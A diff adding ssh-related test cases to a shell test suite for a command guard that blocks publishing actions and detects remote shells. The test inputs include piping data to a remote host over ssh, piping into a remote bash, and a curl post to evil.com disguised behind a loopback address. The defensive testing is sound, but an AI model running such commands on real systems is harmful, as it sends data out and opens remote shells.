@@ -597,6 +597,28 @@ allows $'sudo -u root tee /etc/x <<EOF\ngh pr comment is prose\nEOF'  "a heredoc
 allows $'sudo --user root tee /etc/x <<EOF\ngh pr comment is prose\nEOF' "a heredoc fed to sudo --user tee is data"
 per_line $'sudo -s <<EOF\ngh pr comment 1 -b x\nEOF'          'sudo -s <<'                 "a heredoc fed to sudo -s"
 
+# ssh runs the words after its host as a command line there, as you, and with none it starts a shell there that reads
+# stdin (#113).
+blocks 'ssh host gh pr comment 1 -b x'                    "a publish ssh runs on another host"
+blocks "ssh host 'npm publish'"                           "a quoted publish ssh runs on another host"
+blocks "ssh host 'cd /srv && npm publish'"                "a publish after a cd on another host"
+blocks 'ssh -p 22 host -t gh pr create --fill'            "a ready PR after ssh's options on both sides of its host"
+blocks 'ssh host -- gh pr comment 1 -b x'                 "a publish after ssh's --"
+blocks 'ssh host publish'                                 "a verb after ssh's host still blocks, as before"
+blocks $'ssh host <<EOF\ngh pr comment 1 -b x\nEOF'        "a heredoc fed to ssh with no command"
+allows 'ssh -i key.pem host uptime'                       "ssh running a command that publishes nothing"
+unseen 'cat x | ssh host'                                 "a pipe into ssh with no command"
+unseen 'cat x | ssh -T -i key.pem host'                   "a pipe into ssh with options and no command"
+unseen "ssh host 'cat x | bash'"                          "a pipe into a shell in ssh's command"
+unseen 'ssh host <<<x'                                    "a here-string fed to ssh with no command"
+seen   'cat x | ssh host tee f'                           "ssh running a command that reads the pipe"
+seen   'ssh -fN -L 8080:localhost:80 host'                "ssh -N forwarding a port starts no shell"
+seen   'cat x | ssh -W db:5432 host'                      "ssh -W forwarding stdin starts no shell"
+payload "ssh host 'cd /srv && make'"  "cd /srv && make"   "ssh's command is its payload"
+payload 'ssh -p 22 host -t ls -l'     "ls -l"             "ssh's options on both sides of its host are not its payload"
+payload 'ssh host'                    "(none)"            "ssh with no command has no payload"
+too_much "$(printf 'ssh h x\n%.0s' {1..17})"              "seventeen ssh commands to re-read"
+
 # A quote that closes a URL is not part of its host, for every host form (#135).
 allows 'curl -d x "http://localhost"'              "a quoted localhost URL with no path"
 allows "curl -d x 'http://localhost'"              "a single-quoted localhost URL with no path"
@@ -617,7 +639,7 @@ blocks 'curl -d x "http://127.0.0.1":3000@evil.com' "a loopback user before an @
 # read from a whole quoted word blocks, as does one in the middle of a quoted argument, as before (#131).
 asks   'claude "review this"'                       "a verb from the first piece of a quoted argument"
 asks   'python3 x.py "post this"'                   "a verb from the first piece, after a script"
-asks   "ssh host 'npm publish'"                     "a verb from the last piece of a quoted argument"
+asks   "x host 'npm publish'"                       "a verb from the last piece of a quoted argument"
 asks   'gh "pr create" --fill'                      "a ready PR read from pieces of a quoted argument"
 asks   'x comment\ it'                              "a verb from a word an escaped blank joins to the next"
 asks   "bash -c 'claude \"review this\"'"           "a verb from a piece of a quoted argument in a payload"
